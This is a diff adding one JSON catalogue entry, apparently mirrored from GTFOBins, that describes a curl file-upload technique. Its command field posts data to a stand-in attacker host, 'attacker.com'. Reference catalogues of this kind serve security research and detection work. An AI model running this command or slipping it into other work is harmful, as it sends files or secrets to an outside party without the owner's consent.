@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-curl-upload-2",
+  "name": "GTFOBins · curl (upload) #2",
+  "command": "curl -X POST --data-binary DATA http://attacker.com",
+  "description": "Use curl to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "curl",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/curl/#upload",
+  "upstream_id": "curl/upload/1",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/curl/"
+    }
+  ]
+}
